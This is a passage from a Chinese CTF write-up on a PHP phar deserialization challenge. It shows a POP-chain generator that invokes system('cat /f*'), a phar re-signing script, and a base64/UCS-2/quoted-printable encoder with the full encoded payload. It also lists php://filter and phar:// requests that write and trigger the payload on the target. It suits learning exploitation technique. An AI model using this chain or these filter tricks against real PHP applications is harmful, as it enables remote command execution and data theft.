<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<br>        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>    }<br>}<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$pop1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$pop</span>-&gt;password = [<span class="hljs-variable">$pop1</span>, <span class="hljs-string">'check'</span>];<br><span class="hljs-variable">$pop</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br><span class="hljs-variable">$pop</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<br><span class="hljs-variable">$pop</span>-&gt;username-&gt;test = <span class="hljs-string">'system'</span>;<br><span class="hljs-variable">$pop</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">'cat /f*'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$pop</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314203310329.png" alt="image-20240314203310329"></p>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'D:\\PphProject\\Scripts\\exp.phar'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'newtest.phar'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></tbody></table></figure>
<p>然后就是如何利用伪协议和过滤器读取，因为phar文件含有特殊字符，直接将二进制复制上去根本识别不了，因此会想到用base64编码复制上去。但当我们简单测试一下会发现，如果先发送base64编码内容，接着利用PHP伪协议对内容进行解码会发现这样的报错</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314204944475.png" alt="image-20240314204944475"></p>
<p>至于为何我们是要读取error.txt，完全就是因为当我们输入一些不符合代码的内容，该内容就会被传入error.txt（测试一下就知道了）</p>
<p>上述的报错是因为读取的是整个error.txt文件，其中包括了其他非编码信息,而Base64会将所有数字，字母/+=都认为是需要解码的，而那些其他垃圾数据没有经过base64编码，直接解码肯定会报错。因此靠这个思路，我们会想到怎样才能将除了我们payload之外的内容都搞成乱码（base64识别不了的）这样解码的时候，就会只解码我们的payload而不会报错。</p>
<p>这里就需要新知识了</p>
<h2 id="utf-16le编码">utf-16le编码</h2>
<blockquote>
<p>当utf-8转换为utf-16le时，每一位字符后面都会加上一个\0，这个\0是不可见的，当将utf-16le转换为utf-8的时候，只有后面有\0的才会被正常转换，否则变为乱码</p>
</blockquote>
<p>那么我们是否可以利用utf-16le来标记我们的payload，然后解码只对我们payload解码(其他变成乱码)，然后再base64解码。不过这个被过滤了，我们可以用UCS-2编码（区别在于\0在前面）</p>
<h2 id="UCS-2编码">UCS-2编码</h2>
<blockquote>
<p>UCS-2 编码使用固定2个字节,所以在ASCII字符中,在每个字符前面会填充一个 00字节(大端序)</p>
</blockquote>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">lanb0<br>=&gt;<br>\x00l\x00a\x00n\x00b\x000<br></code></pre></td></tr></tbody></table></figure>
<p>那么下一步就是如何构造<code>\0</code>，因为是不可见字符，所以引入Quoted-Printable编码</p>
<blockquote>
<p>“Quoted-Printable"编码的基本原则是：安全的ASCII字符（如字母、数字、标点符号等）保持不变，空格也保持不变（但行尾的空格必须编码），其他所有字符（如非ASCII字符或控制字符）则以”="后跟两个十六进制数字的形式编码</p>
</blockquote>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">lanb0\n<br>=&gt;<br>lanb0=<span class="hljs-number">0</span>A<br></code></pre></td></tr></tbody></table></figure>
<p>这样的话，整个流程如下：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">测试数据：test<br>base64编码：dGVzdA==<br>加上\<span class="hljs-number">0</span>（等号也要转换）：=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D<br><br>上传后：<br>垃圾数据=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D垃圾数据<br>解码：<br>垃圾数据\<span class="hljs-number">0</span>d \<span class="hljs-number">0</span>G \<span class="hljs-number">0</span>V \<span class="hljs-number">0</span>z \<span class="hljs-number">0</span>d \<span class="hljs-number">0</span>A \<span class="hljs-number">0</span>= \<span class="hljs-number">0</span>=垃圾数据<br>UCS-<span class="hljs-number">2</span>转UTF-<span class="hljs-number">8</span>：乱码dGVzdA==乱码<br>base64解码：test<br></code></pre></td></tr></tbody></table></figure>
<p>加密脚本</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'newtest.phar'</span>);<span class="hljs-comment">//获取二进制数据</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">'utf-8'</span>,<span class="hljs-string">'UCS-2'</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//UCS-2编码</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'hacker.txt'</span>,<span class="hljs-title function_ invoke__">quoted_printable_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//quoted_printable编码</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'hacker.txt'</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/=\r\n/'</span>,<span class="hljs-string">''</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'hacker.txt'</span>)).<span class="hljs-string">'=00=3D'</span>);<span class="hljs-comment">//解决软换行导致的编码结构破坏</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<blockquote>
<p>注：在 Quoted-Printable 编码中，为了防止编码后的字符串过长，通常会在每76个字符后插入一个软换行，也就是 = 符号加上一个换行符。</p>
</blockquote>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>D=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>X=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>X=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>V=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>K=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>k=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>D=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>+=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>D=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>A=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>g=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>u=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>c=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>k=<span class="hljs-number">001</span>=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>e=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>L=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>N=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>E=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>g=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>b=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>k=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>E=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>A=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>u=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>h=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>X=<span class="hljs-number">008</span>=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>H=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>/=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>k=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>w=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>r=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D<br></code></pre></td></tr></tbody></table></figure>
<p>之后直接复制进去访问log/error.txt，接下来就要用到伪协议和过滤器（后面步骤要点击重写文件）</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">php://filter/read=consumed/resource=log/error.txt<br>//可以先用这个删除error.txt文件内容，防止文件内容过多造成后续base64解码报错<br></code></pre></td></tr></tbody></table></figure>
<p>解码quoted-printable</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">php://filter/read=convert.quoted-printable-decode/resource=log/error.txt<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314210636888.png" alt="image-20240314210636888"></p>
<p>解码UCS-2</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">php://filter/read=convert.iconv.UCS-<span class="hljs-number">2</span>.UTF-<span class="hljs-number">8</span>/resource=log/error.txt<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314211604484.png" alt="image-20240314211604484"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">php://filter/write=convert.base64-decode/resource=log/error.txt<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314211913669.png" alt="image-20240314211913669"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">phar://log/error.txt<br></code></pre></td></tr></tbody></table></figure>
<p>这里不知道为什么，到了最后一步总是报错，phar似乎不能绕过，我采用wp的答案也不行，感觉是环境寄了。。。</p>
<p>第二天又看了看，经过文章的仔细比对发现payload不一样，如下图所示，除了第二个，其他都是正确的。</p>
<p>这里我也不知道为何，链子跟师傅们感觉一样，但就是出不来，之后换用师傅们的链子出来过一次，但我自己原来的写法也是一致的感觉，很奇怪</p>
<p><img src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240315082601481.png" alt="image-20240315082601481"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315082623850.png" alt="image-20240315082623850"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315084313385.png" alt="image-20240315084313385"></p>
<p>这里放个最终的payload得了，感觉是环境问题</p>
